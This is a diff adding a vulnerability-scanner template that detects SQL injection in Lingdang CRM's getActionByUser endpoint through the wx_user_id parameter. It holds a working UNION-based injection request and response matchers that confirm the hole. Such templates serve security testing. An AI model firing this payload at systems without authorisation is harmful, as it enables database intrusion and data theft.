@@ -1,0 +1,31 @@
+id: poc-yaml-51mis-crm-getactionbyuser-wx-user-id-sqli
+info:
+  name: Lingdang CRM SQL Injection in getActionByUser wx_user_id
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the `getActionByUser` action of the Lingdang CRM's WeiXinApp marketing module. Exploitation is possible via the wx_user_id parameter.
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+http:
+  - method: GET
+    path:
+      - "/crm/WeiXinApp/marketing/index.php?module=Users&action=getActionByUser&wx_user_id=1+UNION+ALL+SELECT+NULL,NULL,md5({{t1}}),NULL,NULL--+-&keyWords=&page="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"curpagenum\""
+          - "\"totalrows\""
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
